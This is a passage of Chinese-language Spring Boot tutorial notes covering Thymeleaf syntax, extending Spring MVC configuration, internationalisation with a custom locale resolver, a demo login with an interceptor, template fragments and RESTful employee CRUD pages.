th:insert="~{commons :: main}">...&lt;/div>\nLiterals（字面量）\n    Text literals: \'one text\' , \'Another one!\' ,…\n    Number literals: 0 , 34 , 3.0 , 12.3 ,…\n    Boolean literals: true , false\n    Null literal: null\n    Literal tokens: one , sometext , main ,…\nText operations:（文本操作）\n    String concatenation: +\n    Literal substitutions: |The name is ${name}|\nArithmetic operations:（数学运算）\n    Binary operators: + , ‐ , * , / , %\n    Minus sign (unary operator): ‐\n    Boolean operations:（布尔运算）\n    Binary operators: and , or\n    Boolean negation (unary operator): ! , not\n    Comparisons and equality:（比较运算）\n    Comparators: > , &lt; , >= , &lt;= ( gt , lt , ge , le )\n    Equality operators: == , != ( eq , ne )\n    Conditional operators:条件运算（三元运算符）\n    If‐then: (if) ? (then)\n    If‐then‐else: (if) ? (then) : (else)\n    Default: (value) ?: (defaultvalue)\nSpecial tokens:\n\tNo‐Operation: _\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n\n\n\n# SpringMVC自动配置\n\nSpringboot帮我们完成了Springmvc的自动配置，定义在WebMvcAutoConfiguration中。\n\nSpring Boot provides auto-configuration for Spring MVC that works well with most applications.\n\nThe auto-configuration adds the following features on top of Spring’s defaults:\n\n * Inclusion of ContentNegotiatingViewResolver and BeanNameViewResolver beans.\n   \n   * 自动配置了ViewResolver（视图解析器：根据方法的返回值得到视图对象（View），视图对象决定如何渲染）\n   * ContentNegotiatingViewResolver：用于组合所有的视图解析器\n   * 我们可以自己给容器中添加一个视图解析器，会自动将其组合进来。\n\n * Support for serving static resources, including support for WebJars (see below).\n\n * Automatic registration of Converter, GenericConverter, Formatter beans.\n   \n   * Converter：转换器； public String hello(User user)：类型转换使用Converter\n   * Formatter 格式化器； 2017.12.17==>Date\n\n * Support for HttpMessageConverters (see below).\n   \n   * HttpMessageConverter：SpringMVC用来转换Http请求和响应的；User---Json\n   * HttpMessageConverters 是从容器中确定；获取所有的HttpMessageConverter.\n   * 自己给容器中添加HttpMessageConverter，只需要将自己的组件注册容器中 （@Bean,@Component）\n\n * Automatic registration of MessageCodesResolver (see below).\n   \n   * 定义错误代码生成规则\n\n * Static index.html support.\n\n * Custom Favicon support (see below).\n\n * Automatic use of a ConfigurableWebBindingInitializer bean (see below).\n   \n   * 我们可以配置一个ConfigurableWebBindingInitializer来替换默认的。（添加到容器）\n\nIf you want to keep Spring Boot MVC features, and you just want to add additional MVC configuration (interceptors, formatters, view controllers etc.) you can add your own @Configuration class of type WebMvcConfigurerAdapter, but without @EnableWebMvc. If you wish to provide custom instances of RequestMappingHandlerMapping, RequestMappingHandlerAdapter or ExceptionHandlerExceptionResolver you can declare a WebMvcRegistrationsAdapter instance providing such components.\n\nIf you want to take complete control of Spring MVC, you can add your own @Configuration annotated with @EnableWebMvc.\n\n如果我们想要拓展SpringMVC相关配置，如拦截器，资源映射等：\n\n<mvc:view‐controller path="/hello" view‐name="success"/>\n<mvc:interceptors>\n    <mvc:interceptor>\n        <mvc:mapping path="/hello"/>\n        <bean></bean>\n    </mvc:interceptor>\n</mvc:interceptors>\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n我们就需要编写一个配置类，继承WebMvcConfigurerAdapter。\n\n//使用WebMvcConfigurerAdapter可以来扩展SpringMVC的功能\n@Configuration\npublic class MyMvcConfig extends WebMvcConfigurerAdapter {\n    @Override\n    public void addViewControllers(ViewControllerRegistry registry) {\n        // super.addViewControllers(registry);\n        //浏览器发送 /atguigu 请求来到 success\n        registry.addViewController("/atguigu").setViewName("success");\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n原因：\n\n 1. WebMvcAutoConfiguration是SpringMVC的自动配置类\n 2. 在做其他自动配置时会导入@Import(EnableWebMvcConfiguration.class)\n 3. 容器中所有的WebMvcConfigurer都会一起起作用，我们自己编写的也会被调用\n\n@Configuration\npublic static class EnableWebMvcConfiguration extends DelegatingWebMvcConfiguration {\n    private final WebMvcConfigurerComposite configurers = new WebMvcConfigurerComposite();\n    //从容器中获取所有的WebMvcConfigurer\n    @Autowired(required = false)\n    public void setConfigurers(List<WebMvcConfigurer> configurers) {\n        if (!CollectionUtils.isEmpty(configurers)) {\n            this.configurers.addWebMvcConfigurers(configurers);\n            //一个参考实现；将所有的WebMvcConfigurer相关配置都来一起调用；\n            @Override\n            // public void addViewControllers(ViewControllerRegistry registry) {\n            // for (WebMvcConfigurer delegate : this.delegates) {\n            // delegate.addViewControllers(registry);\n            // }\n        }\n    }\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\n全面接管SpringMVC\n\n当我们想要配置SPringMVC的所有细节时，可以使用@EnableWebMvc注解，标注到配置类上。\n\n//使用WebMvcConfigurerAdapter可以来扩展SpringMVC的功能\n@EnableWebMvc\n@Configuration\npublic class MyMvcConfig extends WebMvcConfigurerAdapter {\n    @Override\n    public void addViewControllers(ViewControllerRegistry registry) {\n        // super.addViewControllers(registry);\n        //浏览器发送 /atguigu 请求来到 success\n        registry.addViewController("/atguigu").setViewName("success");\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n原理：\n\n 1. @EnableWebMvc的核心\n\n@Import(DelegatingWebMvcConfiguration.class)\npublic @interface EnableWebMvc {\n\n\n1\n2\n\n\n 2. @Configuration\n    public class DelegatingWebMvcConfiguration extends WebMvcConfigurationSupport {\n    \n    \n    1\n    2\n    \n\n 3. @Configuration\n    @ConditionalOnWebApplication\n    @ConditionalOnClass({ Servlet.class, DispatcherServlet.class,\n                         WebMvcConfigurerAdapter.class })\n    //容器中没有这个组件的时候，这个自动配置类才生效\n    @ConditionalOnMissingBean(WebMvcConfigurationSupport.class)\n    @AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE + 10)\n    @AutoConfigureAfter({ DispatcherServletAutoConfiguration.class,\n                         ValidationAutoConfiguration.class })\n    public class WebMvcAutoConfiguration {\n    \n    \n    \n    1\n    2\n    3\n    4\n    5\n    6\n    7\n    8\n    9\n    10\n    11\n    \n\n 4. @EnableWebMvc将WebMvcConfigurationSupport组件导入进来\n\n\n# 修改Spingboot默认配置\n\nSpringBoot在自动配置很多组件的时候，先看容器中有没有用户自己配置的（@Bean、@Component）如果有，就用用户配置的。如果没有，才自动配置。如果有些组件可以有多个（ViewResolver）将用户配置的和自己默认的组合起来使用。\n\n在SpringBoot中会有非常多的xxxConfigurer帮助我们进行扩展配置。在SpringBoot中会有很多的xxxCustomizer帮助我们进行定制配置\n\n\n# RestFulCRUD\n\n# 1. 引入静态资源\n\n根据上面的Springboot关于静态资源的自动配置，我们只需要将静态资源放置到指定的目录中，如果服务器处理不了指定的请求，就会去静态资源文件夹下寻找。我们在页面中引入静态资源时，也可以使用thymeleaf的语法，这样在请求时就可以排除项目名称对于静态资源的影响了。\n\n# 2. 国际化信息\n\n * 创建国际化配置文件\n   \n   # ========= 默认properties\n   login.btn=登录~\n   login.password=密码~\n   login.remember=记住我~\n   login.tip=请登录~\n   login.username=用户名~\n   \n   # ========= Login_en_US\n   login.btn=Login In.\n   login.password=Password\n   login.remember=Remember Me.\n   login.tip=Please login.\n   login.username=Username\n   \n   # ========= Login_zh_CN\n   login.btn=登录\n   login.password=密码\n   login.remember=记住我\n   login.tip=请登录\n   login.username=用户名\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   \n\n * 由于springboot已经帮助我们配置好了，我们只需要在页面上取值就可以了。但是由于默认配置的路径是类路径下的message，我们的国际化文件放置在i18n目录下，需要在springboot配置文件中指定路径。\n   \n   @Configuration\n   @ConditionalOnMissingBean(value = MessageSource.class, search = SearchStrategy.CURRENT)\n   @AutoConfigureOrder(Ordered.HIGHEST_PRECEDENCE)\n   @Conditional(ResourceBundleCondition.class)\n   @EnableConfigurationProperties\n   @ConfigurationProperties(prefix = "spring.messages")\n   public class MessageSourceAutoConfiguration {\n   \n       private String basename = "messages";\n   \n       @Bean\n       public MessageSource messageSource() {\n           ResourceBundleMessageSource messageSource = new ResourceBundleMessageSource();\n           if (StringUtils.hasText(this.basename)) {\n               messageSource.setBasenames(StringUtils.commaDelimitedListToStringArray(\n                   StringUtils.trimAllWhitespace(this.basename)));\n           }\n           if (this.encoding != null) {\n               messageSource.setDefaultEncoding(this.encoding.name());\n           }\n           messageSource.setFallbackToSystemLocale(this.fallbackToSystemLocale);\n           messageSource.setCacheSeconds(this.cacheSeconds);\n           messageSource.setAlwaysUseMessageFormat(this.alwaysUseMessageFormat);\n           return messageSource;\n       }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   \n   \n   spring:\n     messages:\n       basename: i18n/login\n   \n   \n   1\n   2\n   3\n   \n\n * Thymeleaf获取国际化的值\n   \n   <!DOCTYPE html>\n   <html lang="en" xmlns:th="https://www.thymeleaf.org">\n   \t<head>\n   \t\t<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">\n   \t\t<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">\n   \t\t<meta name="description" content="">\n   \t\t<meta name="author" content="">\n   \t\t<title>Signin Template for Bootstrap</title>\n   \t\t\x3c!-- Bootstrap core CSS --\x3e\n   \t\t<link th:href="@{/asserts/css/bootstrap.min.css}" rel="stylesheet">\n   \t\t\x3c!-- Custom styles for this template --\x3e\n   \t\t<link th:href="@{/asserts/css/signin.css}" rel="stylesheet">\n   \t</head>\n   \n   \t<body class="text-center">\n   \t\t<form class="form-signin" action="dashboard.html">\n   \t\t\t<img class="mb-4" src="asserts/img/bootstrap-solid.svg" alt="" width="72" height="72">\n   \t\t\t<h1 class="h3 mb-3 font-weight-normal" th:text="#{login.tip}">Please sign in</h1>\n   \t\t\t<label class="sr-only" th:text="#{login.username}">Username</label>\n   \t\t\t<input type="text" class="form-control" th:placeholder="#{login.username}" placeholder="Username" required="" autofocus="">\n   \t\t\t<label class="sr-only" th:text="#{login.password}">Password</label>\n   \t\t\t<input type="password" class="form-control" th:placeholder="#{login.password}" placeholder="Password" required="">\n   \t\t\t<div class="checkbox mb-3">\n   \t\t\t\t<label>\n             <input type="checkbox" value="remember-me"> [[#{login.remember}]]\n           </label>\n   \t\t\t</div>\n   \t\t\t<button class="btn btn-lg btn-primary btn-block" type="submit">[[#{login.btn}]]</button>\n   \t\t\t<p class="mt-5 mb-3 text-muted">© 2017-2018</p>\n   \t\t\t<a class="btn btn-sm">中文</a>\n   \t\t\t<a class="btn btn-sm">English</a>\n   \t\t</form>\n   \n   \t</body>\n   \n   </html>\t\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   31\n   32\n   33\n   34\n   35\n   36\n   \n\nspringboot完成国际化的原理：\n\n服务器知道我们需要进行国际化的语言，是因为我们在发送请求时，请求包携带了一个Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7字段，服务器根据该字段将指定的国际化页面返回。有时候我们希望自定义国际化的规则，比如在请求参数中携带当前页面的国际化参数。\n\n<a class="btn btn-sm" th:href="@{/index(language=\'zh_CN\')}">中文</a>\n<a class="btn btn-sm" th:href="@{/index(language=\'en_US\')}">English</a>\n\n\n1\n2\n\n\n自定义国际化处理器：\n\npackage com.pwddd.springboot.component;\n\nimport org.apache.tomcat.jni.Local;\nimport org.springframework.util.StringUtils;\nimport org.springframework.web.servlet.LocaleResolver;\n\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\nimport java.util.Locale;\n\npublic class ParamLocalResolver implements LocaleResolver {\n    @Override\n    public Locale resolveLocale(HttpServletRequest httpServletRequest) {\n        String language = httpServletRequest.getParameter("language");\n        Locale locale = Locale.getDefault();\n        if (!StringUtils.isEmpty(language)){\n            String[] s = language.split("_");\n            locale = new Locale(s[0],s[1]);\n        }else{\n            String languages = httpServletRequest.getHeader("Accept-Language");\n            String defaultLanguage = languages.split(",")[0];\n            String[] split = defaultLanguage.split("-");\n            locale = new Locale(split[0],split[1]);\n        }\n        return locale;\n    }\n\n    @Override\n    public void setLocale(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Locale locale) {\n\n    }\n}\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n\n\n注册国际化处理器，将我们自己的国际化处理器放到容器中。\n\n@Bean\npublic LocaleResolver localeResolver(){\n    return new ParamLocalResolver();\n}\n\n\n1\n2\n3\n4\n\n\n# 3. 登录功能\n\n这次设计的登录功能就不需要链接数据库了，只要提交了用户名，并且密码为123456就判定为登录成功。\n\n * 控制器设置\n   \n   package com.pwddd.springboot.controller;\n   \n   import org.springframework.stereotype.Controller;\n   import org.springframework.util.StringUtils;\n   import org.springframework.web.bind.annotation.GetMapping;\n   import org.springframework.web.bind.annotation.PostMapping;\n   import org.springframework.web.bind.annotation.RequestMapping;\n   import org.springframework.web.bind.annotation.RequestParam;\n   \n   import java.util.Map;\n   \n   @Controller\n   @RequestMapping("/user")\n   public class UserController {\n   \n       @PostMapping("/login")\n       public String login(@RequestParam("username") String username, @RequestParam("password") String password, Map<String,Object> map){\n           if (!StringUtils.isEmpty(username) && !StringUtils.isEmpty(password) && password.equals("123456")){\n               return "dashboard";\n           }else {\n               map.put("msg","登陆失败，请确认用户名密码是否正确~");\n               return "login";\n           }\n       }\n   }\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   \n\n * 错误信息显示\n   \n   <p style="color: red" th:text="${msg}" th:if="${not #strings.isEmpty(msg)}" ></p>\n   当msg不是空的时候显示。\n   \n   \n   1\n   2\n   \n\n * 处理登录信息重复提交 - 使用重定向\n   \n   // 设置视图解析\n   registry.addViewController("/main").setViewName("dashboard");\n   \n   // 修改控制器\n   package com.pwddd.springboot.controller;\n   \n   import org.springframework.stereotype.Controller;\n   import org.springframework.util.StringUtils;\n   import org.springframework.web.bind.annotation.GetMapping;\n   import org.springframework.web.bind.annotation.PostMapping;\n   import org.springframework.web.bind.annotation.RequestMapping;\n   import org.springframework.web.bind.annotation.RequestParam;\n   \n   import java.util.Map;\n   \n   @Controller\n   @RequestMapping("/user")\n   public class UserController {\n   \n       @PostMapping("/login")\n       public String login(@RequestParam("username") String username, @RequestParam("password") String password, Map<String,Object> map){\n           if (!StringUtils.isEmpty(username) && !StringUtils.isEmpty(password) && password.equals("123456")){\n               return "redirect:/main";\n           }else {\n               map.put("msg","登陆失败，请确认用户名密码是否正确~");\n               return "login";\n           }\n       }\n   }\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   \n\n * 登录拦截器机制\n   \n   // 登录添加cookie\n   package com.pwddd.springboot.controller;\n   \n   import org.springframework.stereotype.Controller;\n   import org.springframework.util.StringUtils;\n   import org.springframework.web.bind.annotation.GetMapping;\n   import org.springframework.web.bind.annotation.PostMapping;\n   import org.springframework.web.bind.annotation.RequestMapping;\n   import org.springframework.web.bind.annotation.RequestParam;\n   \n   import javax.servlet.http.HttpSession;\n   import java.util.Map;\n   \n   @Controller\n   @RequestMapping("/user")\n   public class UserController {\n   \n       @PostMapping("/login")\n       public String login(HttpSession httpSession,\n                           @RequestParam("username") String username, @RequestParam("password") String password, Map<String,Object> map){\n           if (!StringUtils.isEmpty(username) && !StringUtils.isEmpty(password) && password.equals("123456")){\n               httpSession.setAttribute("username",username);\n               return "redirect:/main";\n           }else {\n               map.put("msg","登陆失败，请确认用户名密码是否正确~");\n               return "login";\n           }\n       }\n   }\n   \n   \n   // 设置拦截器\n   package com.pwddd.springboot.component;\n   \n   import org.springframework.util.StringUtils;\n   import org.springframework.web.servlet.HandlerInterceptor;\n   import org.springframework.web.servlet.ModelAndView;\n   \n   import javax.servlet.http.HttpServletRequest;\n   import javax.servlet.http.HttpServletResponse;\n   import javax.servlet.http.HttpSession;\n   \n   public class LoginHandlerInterceptor implements HandlerInterceptor {\n       @Override\n       public boolean preHandle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o) throws Exception {\n           // 从Session获取信息\n           HttpSession session = httpServletRequest.getSession();\n           String username = (String) session.getAttribute("username");\n           if (StringUtils.isEmpty(username)){\n               httpServletRequest.setAttribute("msg","没有权限使用~");\n               httpServletRequest.getRequestDispatcher("/index").forward(httpServletRequest,httpServletResponse);\n   \n               return false;\n           }else {\n               return true;\n           }\n       }\n   \n       @Override\n       public void postHandle(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, ModelAndView modelAndView) throws Exception {\n   \n       }\n   \n       @Override\n       public void afterCompletion(HttpServletRequest httpServletRequest, HttpServletResponse httpServletResponse, Object o, Exception e) throws Exception {\n   \n       }\n   }\n   \n   \n   // 添加到容器\n   @Override\n   public void addInterceptors(InterceptorRegistry registry) {\n       registry.addInterceptor(new LoginHandlerInterceptor())\n           .addPathPatterns("/**")\n           .excludePathPatterns("/login","/index","/user/login");\n   }\n   \n   springboot已经做好了静态资源映射，因此不需要我们进行处理。\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   31\n   32\n   33\n   34\n   35\n   36\n   37\n   38\n   39\n   40\n   41\n   42\n   43\n   44\n   45\n   46\n   47\n   48\n   49\n   50\n   51\n   52\n   53\n   54\n   55\n   56\n   57\n   58\n   59\n   60\n   61\n   62\n   63\n   64\n   65\n   66\n   67\n   68\n   69\n   70\n   71\n   72\n   73\n   74\n   75\n   76\n   77\n   78\n   79\n   80\n   \n\n# 4. 公共页面抽取和高亮处理\n\n抽取公共片段\n<div th:fragment="copy">\n&copy; 2011 The Good Thymes Virtual Grocery\n</div>\n2、引入公共片段\n<div th:insert="~{footer :: copy}"></div>\n~{templatename::selector}：模板名::选择器\n~{templatename::fragmentname}:模板名::片段名\n3、默认效果：\ninsert的公共片段在div标签中\n如果使用th:insert等属性进行引入，可以不用写~{}：\n行内写法可以加上：[[~{}]];[(~{})]；\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n三种引入公共片段的th属性：\n\n * th:insert：将公共片段整个插入到声明引入的元素中\n * th:replace：将声明引入的元素替换为公共片段\n * th:include：将被引入的片段的内容包含进这个标签中\n\n<footer th:fragment="copy">\n    &copy; 2011 The Good Thymes Virtual Grocery\n</footer>\n引入方式\n<div th:insert="footer :: copy"></div>\n<div th:replace="footer :: copy"></div>\n<div th:include="footer :: copy"></div>\n效果\n<div>\n    <footer>\n        &copy; 2011 The Good Thymes Virtual Grocery\n    </footer>\n</div>\n<footer>\n    &copy; 2011 The Good Thymes Virtual Grocery\n</footer>\n<div>\n    &copy; 2011 The Good Thymes Virtual Grocery\n</div>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n抽取方式：将所有的公共页面放到templates目录下的common中，在寻找片段时也会去遵循模板的映射。\n\n<nav th:fragment="navbar" class="navbar navbar-dark sticky-top bg-dark flex-md-nowrap p-0">\n    <a class="navbar-brand col-sm-3 col-md-2 mr-0" href="http://getbootstrap.com/docs/4.0/examples/dashboard/#">[[${session.username}]]</a>\n    <input class="form-control form-control-dark w-100" type="text" placeholder="Search" aria-label="Search">\n    <ul class="navbar-nav px-3">\n        <li class="nav-item text-nowrap">\n            <a class="nav-link" href="http://getbootstrap.com/docs/4.0/examples/dashboard/#">Sign out</a>\n        </li>\n    </ul>\n</nav>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n\n\n引入方式：\n\n<div th:replace="common/bar :: navbar" ></div>\n\t\x3c!--使用选择器引入：--\x3e\n<div th:replace="common/bar :: #sidebar" ></div>\n\n\n1\n2\n3\n\n\n在我们的页面中，当我们选择员工管理时，侧边栏并没有高亮到员工管理标签，bootstrap中使用active属性来控制标签是否高亮。\n\n我们可以使用参数化的片段签名来动态的指定标签：\n\n在引入片段时传入参数，在页面上判断参数，动态添加active。\n\n<a class="nav-link" th:class="${activeUri == \'emps\' ? \'nav-link active\' : \'nav-link\'}"\n   th:href="@{/emps}">\n    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-users">\n        <path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"></path>\n        <circle cx="9" cy="7" r="4"></circle>\n        <path d="M23 21v-2a4 4 0 0 0-3-3.87"></path>\n        <path d="M16 3.13a4 4 0 0 1 0 7.75"></path>\n    </svg>\n    员工管理\n</a>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n在引入的时候指定参数：\n\n<div th:replace="common/bar :: #sidebar(acitveUrl=\'main\')" ></div>\n\n\n1\n\n\n# 5.Restful请求\n\n实验功能                 请求URI   请求方式\n查询所有员工               emps    GET\n查询某个员工(来到修改页面)       emp/1   GET\n来到添加页面               emp     GET\n添加员工                 emp     POST\n来到修改页面（查出员工进行信息回显）   emp/1   GET\n修改员工                 emp     PUT\n删除员工                 emp/1   DELETE\n\n * 查询全部员工信息\n   \n   @GetMapping("/emps")\n   public String empList(Model model){\n       Collection<Employee> employees = employeeDao.getAll();\n       model.addAttribute("emps",employees);\n       return "emp/list";\n   }\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   \n   \n   <main role="main" class="col-md-9 ml-sm-auto col-lg-10 pt-3 px-4">\n       <h2>员工列表</h2>\n       <a class="btn btn-secondary btn-success">新增</a>\n   \n       <div class="table-responsive">\n           <table class="table table-striped table-sm">\n               <thead>\n                   <tr>\n                       <th>#</th>\n                       <th>姓名</th>\n                       <th>邮箱</th>\n                       <th>性别</th>\n                       <th>生日</th>\n                       <th>部门</th>\n                       <th>操作</th>\n                   </tr>\n               </thead>\n               <tbody>\n                   <tr th:each="emp:${emps}">\n                       <td th:text="${emp.id}"></td>\n                       <td th:text="${emp.lastName}"></td>\n                       <td th:text="${emp.email}"></td>\n                       <td th:text="${emp.gender} == 0? \'女\':\'男\'"></td>\n                       <td th:text="${#dates.format(emp.birth,\'yyyy-MM-dd\')}"></td>\n                       <td th:text="${emp.department.departmentName}"></td>\n                       <td>\n                           <button class="btn btn-sm btn-primary">修改</button>\n                           <button class="btn btn-sm btn-danger">删除</button>\n                       </td>\n                   </tr>\n               </tbody>\n           </table>\n       </div>\n   </main>\n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   31\n   32\n   33\n   34\n   \n\n * 员工添加操作\n   \n   <a class="btn btn-secondary btn-success" th:href="@{/emp}">新增</a>\n   \n   \n   1\n   \n   \n   <!DOCTYPE html>\n   \x3c!-- saved from url=(0052)http://getbootstrap.com/docs/4.0/examples/dashboard/ --\x3e\n   <html lang="en" xmlns:th="http://www.thymeleaf.org">\n   \n       <head>\n           <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">\n           <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">\n           <meta name="description" content="">\n           <meta name="author" content="">\n   \n           <title>Dashboard Template for Bootstrap</title>\n           \x3c!-- Bootstrap core CSS --\x3e\n           <link href="asserts/css/bootstrap.min.css" th:href="@{/webjars/bootstrap/4.0.0/css/bootstrap.css}" rel="stylesheet">\n   \n           \x3c!-- Custom styles for this template --\x3e\n           <link href="asserts/css/dashboard.css" th:href="@{/asserts/css/dashboard.css}" rel="stylesheet">\n           <style type="text/css">\n               /* Chart.js */\n   \n               @-webkit-keyframes chartjs-render-animation {\n                   from {\n                       opacity: 0.99\n                   }\n                   to {\n                       opacity: 1\n                   }\n               }\n   \n               @keyframes chartjs-render-animation {\n                   from {\n                       opacity: 0.99\n                   }\n                   to {\n                       opacity: 1\n                   }\n               }\n   \n               .chartjs-render-monitor {\n                   -webkit-animation: chartjs-render-animation 0.001s;\n                   animation: chartjs-render-animation 0.001s;\n               }\n           </style>\n       </head>\n   \n       <body>\n           \x3c!--引入抽取的topbar--\x3e\n           \x3c!--模板名：会使用thymeleaf的前后缀配置规则进行解析--\x3e\n           <div th:replace="common/bar::navbar"></div>\n   \n           <div class="container-fluid">\n               <div class="row">\n                   \x3c!--引入侧边栏--\x3e\n                   <div th:replace="common/bar::#sidebar(activeUri=\'emps\')"></div>\n   \n                   <main role="main" class="col-md-9 ml-sm-auto col-lg-10 pt-3 px-4">\n                       \x3c!--需要区分是员工修改还是添加；--\x3e\n                       <form th:action="@{/emp}" method="post">\n                           \x3c!--发送put请求修改员工数据--\x3e\n                           \x3c!--\n   1、SpringMVC中配置HiddenHttpMethodFilter;（SpringBoot自动配置好的）\n   2、页面创建一个post表单\n   3、创建一个input项，name="_method";值就是我们指定的请求方式\n   --\x3e\n                           <input type="hidden" name="_method" value="put" th:if="${emp!=null}"/>\n                           <input type="hidden" name="id" th:if="${emp!=null}" th:value="${emp.id}">\n                           <div class="form-group">\n                               <label>LastName</label>\n                               <input name="lastName" type="text" class="form-control" placeholder="zhangsan" th:value="${emp!=null}?${emp.lastName}">\n                           </div>\n                           <div class="form-group">\n                               <label>Email</label>\n                               <input name="email" type="email" class="form-control" placeholder="zhangsan@atguigu.com" th:value="${emp!=null}?${emp.email}">\n                           </div>\n                           <div class="form-group">\n                               <label>Gender</label><br/>\n                               <div class="form-check form-check-inline">\n                                   <input class="form-check-input" type="radio" name="gender" value="1" th:checked="${emp!=null}?${emp.gender==1}">\n                                   <label class="form-check-label">男</label>\n                               </div>\n                               <div class="form-check form-check-inline">\n                                   <input class="form-check-input" type="radio" name="gender" value="0" th:checked="${emp!=null}?${emp.gender==0}">\n                                   <label class="form-check-label">女</label>\n                               </div>\n                           </div>\n                           <div class="form-group">\n                               <label>department</label>\n                               \x3c!--提交的是部门的id--\x3e\n                               <select class="form-control" name="department.id">\n                                   <option th:selected="${emp!=null}?${dept.id == emp.department.id}" th:value="${dept.id}" th:each="dept:${depts}" th:text="${dept.departmentName}">1</option>\n                               </select>\n                           </div>\n                           <div class="form-group">\n                               <label>Birth</label>\n                               <input name="birth" type="text" class="form-control" placeholder="zhangsan" th:value="${emp!=null}?${#dates.format(emp.birth, \'yyyy-MM-dd HH:mm\')}">\n                           </div>\n                           <button type="submit" class="btn btn-primary" th:text="${emp!=null}?\'修改\':\'添加\'">添加</button>\n                       </form>\n                   </main>\n               </div>\n           </div>\n   \n           \x3c!-- Bootstrap core JavaScript\n   ================================================== --\x3e\n           \x3c!-- Placed at the end of the document so the pages load faster --\x3e\n           <script type="text/javascript" src="asserts/js/jquery-3.2.1.slim.min.js" th:src="@{/webjars/jquery/3.3.1/jquery.js}"><\/script>\n           <script type="text/javascript" src="asserts/js/popper.min.js" th:src="@{/webjars/popper.js/1.11.1/dist/popper.js}"><\/script>\n           <script type="text/javascript" src="asserts/js/bootstrap.min.js" th:src="@{/webjars/bootstrap/4.0.0/js/bootstrap.js}"><\/script>\n   \n           \x3c!-- Icons --\x3e\n           <script type="text/javascript" src="asserts/js/feather.min.js" th:src="@{/asserts/js/feather.min.js}"><\/script>\n           <script>\n               feather.replace()\n           <\/script>\n   \n       </body>\n   \n   </html>\n   \n   \n   \n   1\n   2\n   3\n   4\n   5\n   6\n   7\n   8\n   9\n   10\n   11\n   12\n   13\n   14\n   15\n   16\n   17\n   18\n   19\n   20\n   21\n   22\n   23\n   24\n   25\n   26\n   27\n   28\n   29\n   30\n   31\n   32\n   33\n   34\n   35\n   36\n   37\n   38\n   39\n   40\n   41\n   42\n   43\n   44\n   45\n   46\n   47\n   48\n   49\n   50\n   51\n   52\n   53\n   54\n   55\n   56\n   57\n   58\n   59\n   60\n   61\n   62\n   63\n   64\n   65\n   66\n   67\n   68\n   69\n   70\n   71\n   72\n   73\n   74\n   75\n   76\n   77\n   78\n   79\n   80\n   81\n   82\n   83\n   84\n   85\n   86\n   87\n   88\n   89\n   90\n   91\n   92\n   93\n   94\n   95\n   96\n   97\n   98\n   99\n   100\n   101\n   102\n   103\n   104\n   105\n   106\n   107\n   108\n   109\n   110\n   111\n   112\n   113\n   114\n   115\n   116\n   117\n   118\n   \n   \n   @GetMapping("/emp")\n   public String empPage(Model model){\n       Collection<Department> departments = departmentDao.getDepartments();\n       model.addAttribute("depts",departments);\n       return "emp/add";\n   